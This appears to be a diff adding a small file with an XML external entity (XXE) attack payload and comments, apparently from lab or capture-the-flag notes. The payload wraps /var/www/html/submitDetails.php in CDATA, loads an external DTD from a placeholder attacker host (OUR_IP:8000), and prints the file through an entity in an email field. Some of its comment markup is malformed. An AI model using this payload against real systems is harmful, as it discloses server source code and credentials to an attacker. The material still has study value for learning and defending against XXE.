@@ -1,0 +1,13 @@
+<!--  
+<!DOCTYPE email [
+  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag 
+  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file 
+  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag 
+  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD 
+  %xxe;
+]>
+...
+<email>&joined;</email> <!-- reference the &joined; entity to print the file content 
+
+# -------------------------- -->
+<!ENTITY joined "%begin;%file;%end;">
